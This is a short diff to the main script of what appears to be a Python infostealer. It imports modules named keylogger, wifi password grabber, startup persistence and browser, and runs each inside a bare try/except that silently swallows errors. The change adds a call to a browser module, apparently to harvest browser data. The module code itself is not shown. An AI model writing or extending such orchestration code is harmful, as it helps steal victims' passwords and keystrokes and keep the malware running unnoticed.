@@ -1,4 +1,5 @@
-from modules.info import run
+from modules.browser import run
+from modules.info import start
 from modules.wifi import WifiPasswords
 from modules.keylogger import Keylogger
 from modules.startup import StartUp
@@ -17,7 +18,7 @@ except:
 
 
 try:
-    run()
+    start()
 except:
     pass
 
@@ -25,6 +26,11 @@ except:
 try:
     wifi = WifiPasswords()
     wifi.run()
+except:
+    pass
+
+try:
+    run()
 except:
     pass
 
